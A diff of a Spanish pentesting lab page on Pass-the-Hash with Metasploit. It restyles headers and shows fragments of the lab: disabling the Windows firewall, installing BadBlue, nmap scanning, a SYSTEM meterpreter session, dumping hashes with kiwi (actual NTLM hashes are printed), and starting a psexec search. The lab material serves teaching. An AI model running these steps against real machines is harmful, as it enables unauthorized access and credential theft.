@@ -1,6 +1,21 @@
-# Conectarse con SMB mediante el dumpeo de hashes (Pass-The-Hash)
+---
+icon: key
+layout:
+  title:
+    visible: true
+  description:
+    visible: false
+  tableOfContents:
+    visible: true
+  outline:
+    visible: true
+  pagination:
+    visible: true
+---
 
-## Configurar SMBv2 y reglas firewall
+# Pass-The-Hash en Metasploit
+
+## <mark style="color:purple;">Configurar SMBv2 y reglas firewall</mark>
 
 Abrir cmd como administrador.
 
@@ -24,7 +39,7 @@ Desactivar el firewall para permitir la detección por nmap
 netsh advfirewall set allprofiles state off
 ```
 
-## Instalacion de apache24 en windows
+## <mark style="color:purple;">Instalacion de apache24 en windows</mark>
 
 Nos descargamos apache en `.zip` de la arquitectura que necesitemos en mi caso utilice el archivo llamado `httpd-2.4.62-240718-win64-VS17.zip`.
 
@@ -95,7 +110,7 @@ TCP    0.0.0.0:8080               0.0.0.0:0                 LISTENING
 
 Y si nos vamos a `http://localhost/` tendriamos que ver nuestro apache y cuando hagamos un `nmap`, deberiamos de ver el puerto apache (80) abierto.
 
-## Instalar software BadBlue en apache
+## <mark style="color:purple;">Instalar software BadBlue en apache</mark>
 
 URL BadBlue2.7 = https://badblue-pe.uptodown.com/windows/descargar
 
@@ -111,7 +126,7 @@ Y en la maquina atacante se podra entrar mediante.
 URL = http://<IP>:80/
 ```
 
-## Habilitar usuario Administrador en Windows 7
+## <mark style="color:purple;">Habilitar usuario Administrador en Windows 7</mark>
 
 Primero cambiaremos la contraseña al administrador en el cmd como administrador.
 
@@ -125,7 +140,7 @@ Despues activaremos la cuenta administrador.
 net user Administrador /active:yes
 ```
 
-## Explotar maquina windows, para dumpear los hashes y contectarnos mediante SMB con los hashes
+## <mark style="color:purple;">Explotar maquina windows, para dumpear los hashes y contectarnos mediante SMB con los hashes</mark>
 
 ```shell
 nmap -sCV -p80,8080,445 <IP>
@@ -255,7 +270,7 @@ meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
 ```
 
-## Cargar kiwi y dumpeo de hashes (Teniendo una shell)
+## <mark style="color:purple;">Cargar kiwi y dumpeo de hashes (Teniendo una shell)</mark>
 
 ```shell
 load kiwi
@@ -328,7 +343,7 @@ Administrador = aad3b435b51404eeaad3b435b51404ee:7ce21f17c0aee7fb9ceba532d0546ad
 diseo = aad3b435b51404eeaad3b435b51404ee:b1f702c125f162ed66636c7d825429e2
 ```
 
-## Conectarnos por SMB con los hashes
+## <mark style="color:purple;">Conectarnos por SMB con los hashes</mark>
 
 ```shell
 search psexec
